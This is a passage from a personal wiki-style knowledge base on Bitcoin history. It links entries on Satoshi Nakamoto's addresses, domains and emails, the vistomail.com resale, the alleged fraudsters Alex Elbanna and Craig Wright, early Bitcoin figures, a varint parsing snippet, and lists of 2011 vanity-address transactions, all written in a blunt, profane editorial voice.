- [https://bitcoin.stackexchange.com/questions/91187/was-the-first-full-node-ip-address-satoshis-and-how-did-shim-hide-it](https://bitcoin.stackexchange.com/questions/91187/was-the-first-full-node-ip-address-satoshis-and-how-did-shim-hide-it)

[Hal Finney](#hal-finney-computer-scientist):
- Jan 11, 2009 [https://twitter.com/halfin/status/1110302988](https://twitter.com/halfin/status/1110302988) "Running Bitcoin"

###### Satoshi Bitcoin address

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)

###### Genesis block output address

↑ **Parent:** [Satoshi Bitcoin address](#satoshi-bitcoin-address)  
🏷️ **Tags:** [Bitcoin address](#bitcoin-address)

- [https://www.blockchain.com/explorer/addresses/btc/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa](https://www.blockchain.com/explorer/addresses/btc/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)
- [https://www.reddit.com/r/Bitcoin/comments/16cpsol/someone_transferred_4_btc_to_satoshi_nakamotos/](https://www.reddit.com/r/Bitcoin/comments/16cpsol/someone_transferred_4_btc_to_satoshi_nakamotos/) "Someone transferred 4 [BTC](#bitcoin) to [Satoshi Nakamoto](#satoshi-nakamoto)'s wallet."

<h6 id="bitcoin-org">bitcoin.org</h6>

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)

[https://bitcoin.org](https://bitcoin.org)

Official [Bitcoin](#bitcoin) domain registered by [Satoshi Nakamoto](#satoshi-nakamoto).

Registration: 2008-08-18 by [https://www.namecheap.com](https://www.namecheap.com), an [American](united-states.md) company. But using a privacy oriented registrar: [https://bitcoin.stackexchange.com/questions/89532/how-did-nakamoto-untraceably-pay-for-registering-bitcoin-org](https://bitcoin.stackexchange.com/questions/89532/how-did-nakamoto-untraceably-pay-for-registering-bitcoin-org) It is unknown how he could have paid anonymously, so it seems likely that the true identity could be obtained by [law enforcement](law.md#law-enforcement) if needed.

First archive 2009-01-31: [https://web.archive.org/web/20090131115053/http://bitcoin.org/](https://web.archive.org/web/20090131115053/http://bitcoin.org/) Also from the archive history [https://web.archive.org/web/20100701000000*/bitcoin.org](https://web.archive.org/web/20100701000000*/bitcoin.org), things really started picking up on July 2010. This is almost certainly due to the opening of 

###### First public announcement of Bitoin

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)

[https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html](https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html)

<h6 id="satoshi-s-email-address">Satoshi's email address</h6>

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)

<h6 id="satoshin-at-gmx-com">satoshin@gmx.com</h6>

↑ **Parent:** [Satoshi's email address](#satoshi-s-email-address)

One of [Satoshi's email addresses](#satoshi-s-email-address), this one is given on the [Bitcoin whitepaper](#bitcoin-whitepaper).

<h6 id="satoshi-s-2014-email-hack">Satoshi's 2014 email hack</h6>

↑ **Parent:** [satoshin@gmx.com](#satoshin-at-gmx-com)

[https://blog.bitmex.com/satoshis-2014-email-hack/](https://blog.bitmex.com/satoshis-2014-email-hack/)

<h6 id="satoshi-at-vistomail-com">satoshi@vistomail.com</h6>

↑ **Parent:** [Satoshi's email address](#satoshi-s-email-address)

One of [Satoshi's email addresses](#satoshi-s-email-address), it's how he made the [First public announcement of Bitoin](#first-public-announcement-of-bitoin) on first public announcement of Bitcoin on 2008-10-31. 

At some point later on [vistomail.com](#vistomail-com) was discontinued and acquired by a super dodgy dude, [Alex Elbanna](#alex-elbanna), so it hasn't been Satoshi for a while.

<h6 id="vistomail-com">vistomail.com</h6>

↑ **Parent:** [satoshi@vistomail.com](#satoshi-at-vistomail-com)

[https://www.reddit.com/r/Bitcoin/comments/3h80mi/vistomailcom_closed_and_domain_changed_owner_in/](https://www.reddit.com/r/Bitcoin/comments/3h80mi/vistomailcom_closed_and_domain_changed_owner_in/)

2023-11-17 [https://bitcointalk.org/index.php?topic=5478677.0](https://bitcointalk.org/index.php?topic=5478677.0) "I Bought vistomail.com. Now What?" Restricted topic, but Google caught it: [https://archive.ph/wip/dDxqi](https://archive.ph/wip/dDxqi) The message:

> I am dedicating the next few months, and perhaps even years, to researching Satoshi Nakamoto and the intricacies of blockchain technology. About four weeks ago, I came across vistomail.com for sale on afternic.com and decided to purchase it. I added vistomail.com to my proton.me account and configured it to catch all emails. As a result, numerous emails started flowing in. Subsequently, I connected satoshi@vistomail.com and discovered significant information that I am excited to share with you in the coming months.
> 
> To be clear, I want to emphasize that I am not Satoshi Nakamoto. My interest lies in understanding the future plans for Bitcoin and its impact on the world. I invite you to join me on this journey, contributing your knowledge to the collective understanding. I believe there is a possibility of uncovering the ultimate treasure, and I am eager to share it with all of you.
> 
> twitter @alexelbanna

2023-11-17, 06:46:25 PM. [https://bitcointalk.org/index.php?topic=5474482.0](https://bitcointalk.org/index.php?topic=5474482.0) vistomail.com for sale,  Restricted topic, but Google caught it: [https://archive.ph/wip/GARBy](https://archive.ph/wip/GARBy) The message:

> Vistomail.com has a rich Bitcoin history with Satoshi Nakamoto, the creator of Bitcoin.
> 
> Email address: satoshi@vistomail.com
> 
> $50,000 obo for vistomail.com.  Buy Now: [https://www.afternic.com/listings/778206](https://www.afternic.com/listings/778206)
> 
> How it would be of value:
> 
> You would open a proton.me account add domain vistomail.com. Then you create an address such as: satoshi@vistomail.com and the you can set the domain to a catch all address. All satoshi@vistomail.com emails will come into your inbox. All emails from @vistomail.com going to vistomail.com will now be in your inbox.
> 
> BUY NOW: [https://www.afternic.com/listings/778206](https://www.afternic.com/listings/778206)
> 
> See other domains Satoshi Nakamoto owned here: [https://www.afternic.com/listings/778206](https://www.afternic.com/listings/778206)
> 
> Michael Weber  
> Domain Registrar  
> mweber@dosidos.net

They updated the page to a more scammy one as of 2024: [https://web.archive.org/web/20240310205138/https://www.vistomail.com/](https://web.archive.org/web/20240310205138/https://www.vistomail.com/) mentioning [https://x1coin.org](https://x1coin.org). But still Alex no doubt: [https://twitter.com/AlexElbanna/status/1763575552538001530](https://twitter.com/AlexElbanna/status/1763575552538001530) | [https://github.com/bLeYeNk](https://github.com/bLeYeNk)

As of 2024-04-03, it was parked again on [GoDaddy](computer.md#godaddy), and emails were bouncing.

As of 2024-04-10, it was now a Ghost blogging intance still by Alex: [https://www.vistomail.com/articles-coming-soon/](https://www.vistomail.com/articles-coming-soon/) He added Ciro Santilli as a collaborator, but Ciro could only draft articles which Alex could then review. He allowed a cheeky link to [OurBigBook.com](ourbigbook-com.md) in: [https://archive.ph/8l6az](https://archive.ph/8l6az) epic. Let's see if it gives traffic!

[https://www.vistomail.com/non-profits/](https://www.vistomail.com/non-profits/) claims they were giving out grants via satoshin@nt-medic.com and provided address 1BCwUg3PsLK9wJK815RkmzSMdAnALNHu64

<a id="image-wayback-machine-archive-of-https-www-vistomail-com-default-aspx-on-2013-12-09"></a>
<img src="https://archive.org/download/wayback-machine-vistomail-com-2013/wayback-machine-vistomail-com-2013.png" alt="" height="1067">

**[Figure 8](#image-wayback-machine-archive-of-https-www-vistomail-com-default-aspx-on-2013-12-09). Wayback Machine archive of https://www.vistomail.com/Default.aspx on 2013-12-09**. [Source](https://web.archive.org/web/20131209082226/https://www.vistomail.com/Default.aspx).

###### Alex Elbanna

↑ **Parent:** [vistomail.com](#vistomail-com)  
🏷️ **Tags:** [Fraudster](law.md#fraudster)

- [https://twitter.com/AlexElbanna](https://twitter.com/AlexElbanna)
- [https://www.linkedin.com/in/alex-elbanna/](https://www.linkedin.com/in/alex-elbanna/)

Shady shady owner of "[vistomail.com](#vistomail-com)" sine November 2023. He sends emails as [satoshi@vistomail.com](#satoshi-at-vistomail-com) without any disclaimers, Godlike.

<img src="https://web.archive.org/web/20240415144643if_/https://speakerhub.com/sites/default/files/styles/speakerhub_full_screen/public/user/gallery/2021/01/16/alexander-elbanna-gallery.jpg" alt="" height="600">

**[Figure 9](#_447)** [Source](https://speakerhub.com/speaker/alexander-elbanna). Source linked to from his [Twitter](social-technology.md#twitter) account: [https://web.archive.org/web/20240415144643if_/https://speakerhub.com/sites/default/files/styles/speakerhub_full_screen/public/user/gallery/2021/01/16/alexander-elbanna-gallery.jpg](https://web.archive.org/web/20240415144643if_/https://speakerhub.com/sites/default/files/styles/speakerhub_full_screen/public/user/gallery/2021/01/16/alexander-elbanna-gallery.jpg)

He or someone with the same name is having some fun with the [SEC](united-states.md#u-s-securities-and-exchange-commission): [https://dockets.justia.com/docket/florida/flmdce/8:2023cv01638/416506](https://dockets.justia.com/docket/florida/flmdce/8:2023cv01638/416506) for "Securities Fraud".

The complaint: [https://www.sec.gov/files/litigation/complaints/2023/comp25785.pdf](https://www.sec.gov/files/litigation/complaints/2023/comp25785.pdf) ([archive](https://web.archive.org/web/20231218145545/https://www.sec.gov/files/litigation/complaints/2023/comp25785.pdf)). Some pearls:

> 41. Elbanna told investors several other lies to gain investors’ trust. These included his claim that he had served in the U.S. Marines, when in reality he was discharged after just fifteen days of their thirteen-week recruit training. Elbanna claimed that he had worked at the U.S. [National Security Agency](science.md#national-security-agency) (“NSA”). He further claimed that the NSA was aware of and participating in the Digital World Exchange enterprise. All of these claims were false.
> 
> 42. Perhaps most incredibly, after claiming that he had “been in blockchain technology since the beginning” and “in the cryptocurrency space almost since its inception” in the May 2018 and March 2019 Whitepapers, respectively, Elbanna told investors in a chat program in April 2019 that he “was one of the first 4 creators of BTC.” He went so far as to tell another investor that he was the pseudonymous inventor of bitcoin, [Satoshi Nakamoto](#satoshi-nakamoto) himself. These statements were also false. Elbanna later admitted that he was not involved in blockchain technology from its beginning, and that he “didn’t even really know much about crypto” in 2018, the year he launched the Digital World Exchange enterprise.

[https://www.law360.com/articles/1803299/bogus-nsa-worker-to-pay-sec-2-2m-in-crypto-scam-case](https://www.law360.com/articles/1803299/bogus-nsa-worker-to-pay-sec-2-2m-in-crypto-scam-case) says he had to pay $2.2M to the [SEC](united-states.md#u-s-securities-and-exchange-commission).

The documentary Bitconned from [Netflix](computer.md#netflix) comes strongly to mind, [https://www.imdb.com/title/tt30317302/](https://www.imdb.com/title/tt30317302/). It is unbelieveable people would fall for that kind of thing, the founders are not even sophisticated. And on top of that he agrees to appear on a documentary!!! OMG.

###### Satoshi Nakamoto candidate

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)

###### Craig Steven Wright

↑ **Parent:** [Satoshi Nakamoto candidate](#satoshi-nakamoto-candidate)  
🏷️ **Tags:** [Fraudster](law.md#fraudster)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Craig_Steven_Wright)

This dude actually managed to convince a brain-dead [British](united-kingdom.md) court that he was [Satoshi](#satoshi-nakamoto) and force a takedown of the [Bitcoin whitepaper](#bitcoin-whitepaper) from [https://bitcoin.org/bitcoin.pdf](https://bitcoin.org/bitcoin.pdf) where it had been for many years prior: [https://coinmarketcap.com/academy/article/bitcoin-org-ordered-to-take-down-bitcoin-whitepaper-because-of-copyright-infringement](https://coinmarketcap.com/academy/article/bitcoin-org-ordered-to-take-down-bitcoin-whitepaper-because-of-copyright-infringement) The page was updated to simply display the following [Satoshi](#satoshi-nakamoto) quote:

> It takes advantage of the nature of information being easy to spread but hard to stifle. - [Satoshi Nakamoto](#satoshi-nakamoto)

<a id="image-craig-steven-wright"></a>
![](https://web.archive.org/web/20240806140618if_/https://i.guim.co.uk/img/media/a3e4de579a13e709b9705e1225804654b5e61e14/1009_1_2530_1518/master/2530.jpg?width=620&amp;dpr=2&amp;s=none)

**[Figure 10](#image-craig-steven-wright). Craig Steven Wright**. [Source](https://www.theguardian.com/technology/2021/dec/07/australian-man-craig-wright-wins-us-court-battle-for-bitcoin-fortune-worth-billions).

The mere thought that Satoshi would attempt to copyright takedown the [Bitcoin whitepaper](#bitcoin-whitepaper), and not be able to back his identidy with any cryptographic keys, makes one shrivel to the bones.

Also, kids, this is why you put a fucking [license](law.md#license) on everything you release to the public, and especially when doing so anonymously!!! A quick [CC BY-SA](law.md#cc-by-sa) on that paper would have prevented all this bullshit.

The existence of this outrageous fraudster has had two good effects on the world however it must be said:
- the release of [Adam Back](#adam-back) and [Martti Malmi](#martti-malmi) early email history with Satoshi: [https://www.forbes.com/sites/digital-assets/2024/02/23/new-emails-reveal-staggering-clues-to-the-mystery-of-bitcoin-creator-satoshi-nakamoto](https://www.forbes.com/sites/digital-assets/2024/02/23/new-emails-reveal-staggering-clues-to-the-mystery-of-bitcoin-creator-satoshi-nakamoto)
- the [memes](science.md#meme): [Craig Steven Wright memes](#craig-steven-wright-meme)

Timeline:
- 2015-12-08 Wired article claims he may be Satoshi: [https://www.wired.com/2015/12/bitcoins-creator-satoshi-nakamoto-is-probably-this-unknown-australian-genius/](https://www.wired.com/2015/12/bitcoins-creator-satoshi-nakamoto-is-probably-this-unknown-australian-genius/). A few days later, evidence of foul play emerged, and on 2019-04-30 Wired retracted the article altogether
- 2016-05-02 publicly claims he is Satoshi [https://www.timesofisrael.com/australian-entrepreneur-craig-wright-says-he-created-bitcoin/](https://www.timesofisrael.com/australian-entrepreneur-craig-wright-says-he-created-bitcoin/)
- 2024-05-20 British judge James Mellor fisting the fuck out of Craig: [https://www.reuters.com/technology/self-proclaimed-bitcoin-inventor-lied-repeatedly-support-claim-says-uk-judge-2024-05-20/](https://www.reuters.com/technology/self-proclaimed-bitcoin-inventor-lied-repeatedly-support-claim-says-uk-judge-2024-05-20/)

  > An [Australian](https://ourbigbook.com/go/topic/australian) computer scientist who claimed he invented bitcoin lied "extensively and repeatedly" and forged documents "on a grand scale" to support his false claim, a judge at London's High Court ruled on Monday.

  > Dr Wright presents himself as an extremely clever person. However, in my judgment, he is not nearly as clever as he thinks he is.

Social media:
- [https://twitter.com/Dr_CSWright](https://twitter.com/Dr_CSWright)
- [CoinGeek](#coingeek)

Interesting
- [https://www.reddit.com/r/Bitcoin/comments/4i7k9a/strange_edits_on_craig_wrights_wikipedia_page/](https://www.reddit.com/r/Bitcoin/comments/4i7k9a/strange_edits_on_craig_wrights_wikipedia_page/) "Strange edits on Craig Wright's Wikipedia page made two days before the revelation, from an IP address in Barbados (possibly made by Craig himself?)"

###### Craig Steven Wright meme

↑ **Parent:** [Craig Steven Wright](#craig-steven-wright)  
🏷️ **Tags:** [Meme](science.md#meme)

TODO find the Shroud of Turin one.

- [https://twitter.com/digitalnaut/status/1757464079076098212](https://twitter.com/digitalnaut/status/1757464079076098212) vampire killed by cross of cryptographic evidence 

###### Craig Steven Wright is the Billy Mitchell of Bitcoin

↑ **Parent:** [Craig Steven Wright](#craig-steven-wright)

[Billy Mitchell](law.md#billy-mitchell-gamer) comes strongly to mind!
- [https://www.reddit.com/r/bsv/comments/19bu4qi/both_these_posts_compare_billy_mitchell_and_craig/](https://www.reddit.com/r/bsv/comments/19bu4qi/both_these_posts_compare_billy_mitchell_and_craig/)
- [https://twitter.com/digitalnaut/status/1645477537819000834](https://twitter.com/digitalnaut/status/1645477537819000834)
They even look similarly fraudulent.

###### CoinGeek

↑ **Parent:** [Craig Steven Wright](#craig-steven-wright)

[https://news.ycombinator.com/item?id=14691623](https://news.ycombinator.com/item?id=14691623)

> CoinGeek is either run by or paid for by Craig Wright. You can see that all of the articles are either strongly in his favor or in line with his recent opinions.

###### Adam Back

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Adam_Back)

###### Hashcash

↑ **Parent:** [Adam Back](#adam-back)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Hashcash)

###### David Chaum

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/David_Chaum)

###### ecash

↑ **Parent:** [David Chaum](#david-chaum)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/ecash)

###### Hal Finney (computer scientist)

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Hal_Finney_(computer_scientist))

###### Martti Malmi

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Martti_Malmi)

- [https://twitter.com/marttimalmi](https://twitter.com/marttimalmi)

###### Nick Szabo

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Nick_Szabo)

###### bit gold

↑ **Parent:** [Nick Szabo](#nick-szabo)

###### Wei Dai

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Wei_Dai)

###### b-money

↑ **Parent:** [Wei Dai](#wei-dai)

###### Bitcoin whitepaper

↑ **Parent:** [Satoshi Nakamoto](#satoshi-nakamoto)

Released by [Satoshi Nakamoto](#satoshi-nakamoto) on the early [mailing list](website.md#mailing-list) discussions where [Bitcoin](#bitcoin) was announced.

Reuploaded into the blockchain itself: [https://bitcoin.stackexchange.com/questions/35959/how-is-the-whitepaper-decoded-from-the-blockchain-tx-with-1000x-m-of-n-multisi/105574#105574](https://bitcoin.stackexchange.com/questions/35959/how-is-the-whitepaper-decoded-from-the-blockchain-tx-with-1000x-m-of-n-multisi/105574#105574) by using the [Satoshi uploader](#satoshi-uploader).

More conveniently available on [bitcoin.org](#bitcoin-org): [https://bitcoin.org/bitcoin.pdf](https://bitcoin.org/bitcoin.pdf) nowadays, except when it was down for a few years due to our master [Craig Steven Wright](#craig-steven-wright).

###### [Bitcoin](#bitcoin) miner

↑ **Parent:** [Bitcoin person](#bitcoin-person)

###### Eric Elliot

↑ **Parent:** [Bitcoin miner](#bitcoin-miner)

Likely accounts:
- [https://medium.com/@_ericelliott](https://medium.com/@_ericelliott)
- [https://www.youtube.com/@_ericelliott/videos](https://www.youtube.com/@_ericelliott/videos)
- [https://x.com/ericelliott_](https://x.com/ericelliott_) him? [https://x.com/ericelliott_/status/1227080858571399169?lang=en](https://x.com/ericelliott_/status/1227080858571399169?lang=en)> Mined Bitcoin in 2010. Stopped mining because I thought it wouldn't be profitable. Lost computer. Dreading the regret I'll feel when it hits $100k during the next 10x surge.
- [https://ericelliottjs.com/](https://ericelliottjs.com/)

Bibliography:
- [https://www.reddit.com/r/Bitcoin/comments/1dtw1nz/the_visionary_miner_how_eric_elliot_mined_1/](https://www.reddit.com/r/Bitcoin/comments/1dtw1nz/the_visionary_miner_how_eric_elliot_mined_1/)

<a id="video-how-i-make-money-mining-bitcoins-interview-with-eric-elliot-by-cnn-business"></a>
**[Video 2](#video-how-i-make-money-mining-bitcoins-interview-with-eric-elliot-by-cnn-business). How I make money mining bitcoins interview with Eric Elliot by CNN Business.** [Source](https://www.youtube.com/watch?v=yFE2FV9ia1s).

###### Bitcoin entrepreneur

↑ **Parent:** [Bitcoin person](#bitcoin-person)

###### Bitcoin investor

↑ **Parent:** [Bitcoin person](#bitcoin-person)

<a id="video-what-happened-when-bitcoin-made-people-rich-quickly-by-vice-news-2022"></a>
**[Video 3](#video-what-happened-when-bitcoin-made-people-rich-quickly-by-vice-news-2022). What Happened When Bitcoin Made People Rich Quickly? by Vice News (2022)** [Source](https://www.youtube.com/watch?v=2hZ-Q9QTL2s). Meh, too long and not many cool things.

###### Erik Finman

↑ **Parent:** [Bitcoin investor](#bitcoin-investor)

[https://www.unilad.com/technology/erik-finman-bitcoin-12-year-old-millionaire-invest-798094-20231207](https://www.unilad.com/technology/erik-finman-bitcoin-12-year-old-millionaire-invest-798094-20231207)

> In 2011, Finman made a deal with his parents that he would not pursue a college degree as he wanted to make his fortune outside of traditional education.
> 
> After receiving $1,245 from his grandmother that year, Finman invested into Bitcoin (BTC) - which was then trading at around $12 - and this gave him about 103 BTC.

Shame that he seems to be a [American exceptionalism](united-states.md#american-exceptionalism) idiot. Perhaps it was inevitable given his circonstances. After a small market crash: [https://x.com/erikfinman/status/1820457023013626322](https://x.com/erikfinman/status/1820457023013626322). 

> Opportunities like this come across only once every few years.
> 
> This ain’t financial advice…
> 
> But if you got the cash.
> 
> Never bet against America

###### Erik Finman thinks school is broken

↑ **Parent:** [Erik Finman](#erik-finman)

[https://archive.ph/fYpC1](https://archive.ph/fYpC1)

> The way the education system is structured now, I wouldn't recommend it, It doesn't work for anyone. I would recommend the [Internet](computer.md#internet), which is all free. You can learn a million times more off [YouTube](website.md#youtube) and [Wikipedia](website.md#wikipedia).

###### Davinci Jeremie

↑ **Parent:** [Bitcoin investor](#bitcoin-investor)

<a id="video-just-buy-1-worth-of-bitcoin-please-by-davinci-jeremie-2013"></a>
**[Video 4](#video-just-buy-1-worth-of-bitcoin-please-by-davinci-jeremie-2013). Just buy $1 worth of Bitcoin please! by Davinci Jeremie (2013)** [Source](https://www.youtube.com/watch?v=Cw29h7LhEuE).

#### Sup!? (P2FK client)

↑ **Parent:** [Bitcoin](#bitcoin)

[https://github.com/embiimob/Sup](https://github.com/embiimob/Sup)

<a id="video-sup-buying-listing-and-offers-by-embii"></a>
**[Video 5](#video-sup-buying-listing-and-offers-by-embii). Sup!? Buying, Listing and Offers by EMBII.** [Source](https://www.youtube.com/watch?v=cr6XjUrmmNY).

#### Bitcoin protocol

↑ **Parent:** [Bitcoin](#bitcoin)

[https://en.bitcoin.it/wiki/Protocol_documentation](https://en.bitcoin.it/wiki/Protocol_documentation)

##### Bitcoin protocol data type

↑ **Parent:** [Bitcoin protocol](#bitcoin-protocol)

###### Bitcoin varint

↑ **Parent:** [Bitcoin protocol data type](#bitcoin-protocol-data-type)

[https://en.bitcoin.it/wiki/Protocol_documentation#Variable_length_integer](https://en.bitcoin.it/wiki/Protocol_documentation#Variable_length_integer)

Implementations:
- [Python](programming-language.md#python-programming-language): [https://github.com/alecalve/python-bitcoin-blockchain-parser/blob/c06f420995b345c9a193c8be6e0916eb70335863/blockchain_parser/utils.py#L41](https://github.com/alecalve/python-bitcoin-blockchain-parser/blob/c06f420995b345c9a193c8be6e0916eb70335863/blockchain_parser/utils.py#L41). Sample usage to extract 3 values from a `bytes` object:
  ```
  file, off = decode_varint(value)
  blk_off, off = decode_varint(value[off:])
  tx_off, off = decode_varint(value[off:])
  ```

##### Bitcoin transaction

↑ **Parent:** [Bitcoin protocol](#bitcoin-protocol)

###### Bitcoin address

↑ **Parent:** [Bitcoin transaction](#bitcoin-transaction)  
🏷️ **Tags:** [Address (cryptocurrency)](#address-cryptocurrency)

###### Bitcoin vanity address

↑ **Parent:** [Bitcoin address](#bitcoin-address)  
🏷️ **Tags:** [Vanity address](#vanity-address)

Some early ones we can find:
- [tx 0215a8214297a4b7eb044641cb641c64c8a822c518841a830878c163d74feb91](https://www.blockchain.com/explorer/transactions/btc/0215a8214297a4b7eb044641cb641c64c8a822c518841a830878c163d74feb91) block 128700 (2011-06-05) sends to the spendable [1NLkboNANZAsxHyMLoyvAEYkhpxCS4gWA8](https://www.blockchain.com/explorer/addresses/btc/1NLkboNANZAsxHyMLoyvAEYkhpxCS4gWA8) which contains the word "bonanzas" (8-letters)
- [tx 08d6efecf6119729fac4d148ffbe3a67344b641ed87284be23a34e072cb2dc9f](https://www.blockchain.com/explorer/transactions/btc/08d6efecf6119729fac4d148ffbe3a67344b641ed87284be23a34e072cb2dc9f) block 133837 (2011-06-29) has [17kEAfXiu9a6fpQs91J2kAMBtRprESENtS](https://www.blockchain.com/explorer/addresses/btc/17kEAfXiu9a6fpQs91J2kAMBtRprESENtS) ends in "presents" (8-letter). Unspent but possible.
  - Also its sister output on  sends to 
[1Ga9Dizn1p6ctGWausC1osLSrXFdioxide](https://www.blockchain.com/explorer/addresses/btc/1Ga9Dizn1p6ctGWausC1osLSrXFdioxide) which ends in "dioxide" (7-letter), and is spendable

###### Bitcoin 2011 vanity address pool

↑ **Parent:** [Bitcoin vanity address](#bitcoin-vanity-address)

This section lists transactions from 2011 that appear to contain pools of vanity addresses. There were first discovered while researching [Base58 messages](cool-data-embedded-in-the-bitcoin-blockchain.md#base58-messages), but since they just contain bulk commercial stuff with little artistic value we've decided to keep them here instead of in the museum:

- [https://www.blockchain.com/explorer/transactions/btc/ae4409fabfce84cc9f665f16b5a6219ca8b708fdbed7264adbb7b6053cdfb1c1](https://www.blockchain.com/explorer/transactions/btc/ae4409fabfce84cc9f665f16b5a6219ca8b708fdbed7264adbb7b6053cdfb1c1) block 136273 (2011-07-14) chains as:
  - [https://www.blockchain.com/explorer/transactions/btc/60d7988fd2bc22ce764f9651b20fc3e7418ab6ab57c7057a16dfedd22e837b11](https://www.blockchain.com/explorer/transactions/btc/60d7988fd2bc22ce764f9651b20fc3e7418ab6ab57c7057a16dfedd22e837b11)
  - [https://www.blockchain.com/explorer/transactions/btc/b444cadfd1b7ba09db7b20f22f016f2f51a719ed2fa950ef8bfb08f5f0698461](https://www.blockchain.com/explorer/transactions/btc/b444cadfd1b7ba09db7b20f22f016f2f51a719ed2fa950ef8bfb08f5f0698461)
  - [https://www.blockchain.com/explorer/transactions/btc/f43a181396fcb7d32cc5d3c2d0fa042530175431877a974ea49e53983b136234](https://www.blockchain.com/explorer/transactions/btc/f43a181396fcb7d32cc5d3c2d0fa042530175431877a974ea49e53983b136234)
  - [https://www.blockchain.com/explorer/transactions/btc/1853412f96aa2257c5305aa57c920a18ae583b2ab5836a0d7962f1c4cc77e7a3](https://www.blockchain.com/explorer/transactions/btc/1853412f96aa2257c5305aa57c920a18ae583b2ab5836a0d7962f1c4cc77e7a3)
  - [https://www.blockchain.com/explorer/transactions/btc/4b048794496e3ab65626b6e790e8f732e479ee60da504e16b45171588c1e7ecf](https://www.blockchain.com/explorer/transactions/btc/4b048794496e3ab65626b6e790e8f732e479ee60da504e16b45171588c1e7ecf)
  - [https://www.blockchain.com/explorer/transactions/btc/df39437f2bf124d9b28d215ff7f4ec749ae400701952ba8f1ef77699521dff30](https://www.blockchain.com/explorer/transactions/btc/df39437f2bf124d9b28d215ff7f4ec749ae400701952ba8f1ef77699521dff30)
  - [tx acdd81bab63ee42e28296dd5c21e8a29392e409026fc206acf5931b12a31141d](https://www.blockchain.com/explorer/transactions/btc/acdd81bab63ee42e28296dd5c21e8a29392e409026fc206acf5931b12a31141d) block 136273 (2011-07-14):
  - [tx fc3d7b3a46ac572ea62a1d64303f0e06be84ff2d4a078f5758cd9f7e763cd2ee](https://www.blockchain.com/explorer/transactions/btc/fc3d7b3a46ac572ea62a1d64303f0e06be84ff2d4a078f5758cd9f7e763cd2ee) block 136463
- [tx e79a1bb8c40023219e9247464ac15c02d2c2d784d4f0a025be8958e8d25a052e](https://www.blockchain.com/explorer/transactions/btc/e79a1bb8c40023219e9247464ac15c02d2c2d784d4f0a025be8958e8d25a052e) block 136273 chains as:
  - [tx 751ff11286a43da5d6cf7da8f5bc736e522bbd698ec03c76c63368e5260667e6](https://www.blockchain.com/explorer/transactions/btc/751ff11286a43da5d6cf7da8f5bc736e522bbd698ec03c76c63368e5260667e6) block 136463
- ths chain is weird. It starts off with most addresses not meaning much in Base58, but towards the end they get much clearer
- [tx 19e84a54514a1e7f9f82e055f816c4f2f61b64742dc26ade22d9844ea62afe8d](https://www.blockchain.com/explorer/transactions/btc/19e84a54514a1e7f9f82e055f816c4f2f61b64742dc26ade22d9844ea62afe8d) block 134171 (2011-07-01) This one also has one apparently legit spend of 1seXytZXUv8fbgJ8XMHYUKL8vmxQnvzVz. Chains as:
  - [https://www.blockchain.com/explorer/transactions/btc/a364fec1e5744500da51e2d598e223a8d5c72825c278eacba27d465a94ad47f7](https://www.blockchain.com/explorer/transactions/btc/a364fec1e5744500da51e2d598e223a8d5c72825c278eacba27d465a94ad47f7)
  - [https://www.blockchain.com/explorer/transactions/btc/e5ce576fa077e17dfc1ff732a09cbf5d0452d99e0dbf2af651c92200c1b08eec](https://www.blockchain.com/explorer/transactions/btc/e5ce576fa077e17dfc1ff732a09cbf5d0452d99e0dbf2af651c92200c1b08eec)
  - [https://www.blockchain.com/explorer/transactions/btc/4e7b84a7ee19b7ea9f2d69fcb2734fb096cb012b413f8897b4f42871b225faba](https://www.blockchain.com/explorer/transactions/btc/4e7b84a7ee19b7ea9f2d69fcb2734fb096cb012b413f8897b4f42871b225faba)
  - [https://www.blockchain.com/explorer/transactions/btc/0e058abfe294c051262610ff689a75577f5884529cc1cfcc108cd491b0d6b64f](https://www.blockchain.com/explorer/transactions/btc/0e058abfe294c051262610ff689a75577f5884529cc1cfcc108cd491b0d6b64f)
  - [https://www.blockchain.com/explorer/transactions/btc/41e46057b8f8363c90389ed8d1a3fbb9cddcd769b6f154b2cf44c12a52a88703](https://www.blockchain.com/explorer/transactions/btc/41e46057b8f8363c90389ed8d1a3fbb9cddcd769b6f154b2cf44c12a52a88703)
  - [https://www.blockchain.com/explorer/transactions/btc/e48cc096ecc36c88bb3adc7194fe1dd5eeec36ad9fd400e083e8c8c519635f10](https://www.blockchain.com/explorer/transactions/btc/e48cc096ecc36c88bb3adc7194fe1dd5eeec36ad9fd400e083e8c8c519635f10)
  - [https://www.blockchain.com/explorer/transactions/btc/7a372b4c62d1e160763eea609caeeea32c02eaf43d96b2c4ad2e899e64824cf8](https://www.blockchain.com/explorer/transactions/btc/7a372b4c62d1e160763eea609caeeea32c02eaf43d96b2c4ad2e899e64824cf8)
  - [https://www.blockchain.com/explorer/transactions/btc/3b815a6ce2521441553fca729dc90aadca3acdba182cffac0da05922e0959c83](https://www.blockchain.com/explorer/transactions/btc/3b815a6ce2521441553fca729dc90aadca3acdba182cffac0da05922e0959c83)
  - [https://www.blockchain.com/explorer/transactions/btc/46d94049ef2cd2b849949f6d704f4680034dacab7940fbdc1874289404783bbb](https://www.blockchain.com/explorer/transactions/btc/46d94049ef2cd2b849949f6d704f4680034dacab7940fbdc1874289404783bbb)
